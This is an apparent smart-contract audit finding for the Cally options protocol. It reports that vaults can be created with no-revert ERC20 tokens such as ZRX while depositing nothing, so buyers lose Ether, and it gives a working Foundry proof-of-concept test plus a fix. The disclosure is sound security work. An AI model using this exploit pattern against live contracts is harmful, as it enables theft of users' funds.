## Tags

- bug
- 3 (High Risk)
- resolved
- sponsor confirmed

# [no-revert-on-transfer ERC20 tokens can be drained](https://github.com/code-423n4/2022-05-cally-findings/issues/89) 

# Lines of code

https://github.com/code-423n4/2022-05-cally/blob/main/contracts/src/Cally.sol#L198-L200


# Vulnerability details

## Impact
Some ERC20 tokens don't throw but just return false when a transfer fails. This can be abused to trick the `createVault()` function to initialize the vault without providing any tokens. A good example of such a token is *ZRX*: [Etherscan code](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code#L64)

When such a vault is initialized, another user can both buy and exercise the option without ever receiving any funds. The creator of the vault does receive the buyer's Ether tho. So it can cause a loss of funds.

## Proof of Concept
The trick is to create a vault with an ERC20 token but use ERC721 as the vault's type. Then, instead of calling `safeTransferFrom()` the function calls `transferFrom()` which won't catch the token returning false.

Here's a test that showcases the issue:

```solidity
// CreateVault.t.sol
    function testStealFunds() public {
        // address of 0x on mainnet
        address t = address(0xE41d2489571d322189246DaFA5ebDe1F4699F498);
        vm.startPrank(babe);
        require(ERC20(t).balanceOf(babe) == 0);
        uint vaultId = c.createVault(100, t, 1, 1, 1, 0, Cally.TokenType.ERC721);
        // check that neither the Cally contract nor the vault creator
        // had any 0x tokens
        require(ERC20(t).balanceOf(babe) == 0);
        require(ERC20(t).balanceOf(address(c)) == 0);

        // check whether vault was created properly
        Cally.Vault memory v = c.vaults(vaultId);
        require(v.token == t);
        require(v.tokenIdOrAmount == 100);
        vm.stopPrank();
        // So now there's a vault for 100 0x tokens although the Cally contract doesn't
        // have any.
        // If someone buys & exercises the option they won't receive any tokens.
        uint premium = 0.025 ether;
        uint strike = 2 ether;
        require(address(c).balance == 0, "shouldn't have any balance at the beginning");
        require(payable(address(this)).balance > 0, "not enough balance");

        uint optionId = c.buyOption{value: premium}(vaultId);
        c.exercise{value: strike}(optionId);

        // buyer of option (`address(this)`) got zero 0x tokens
        // But buyer lost their Ether
        require(ERC20(t).balanceOf(address(this)) == 0);
        require(address(c).balance > 0, "got some money");
    }
```

To run it, you need to use forge's forking mode: `forge test --fork-url <alchemy/infura URL> --match testStealFunds`

## Tools Used
none

## Recommended Mitigation Steps
I think the easiest solution is to use `safeTransferFrom()` when the token is of type ERC721. Since the transfer is at the end of the function there shouldn't be any risk of reentrancy. If someone passes an ERC20 address with type ERC721, the `safeTransferFrom()` call would simply fail since that function signature shouldn't exist on ERC20 tokens.

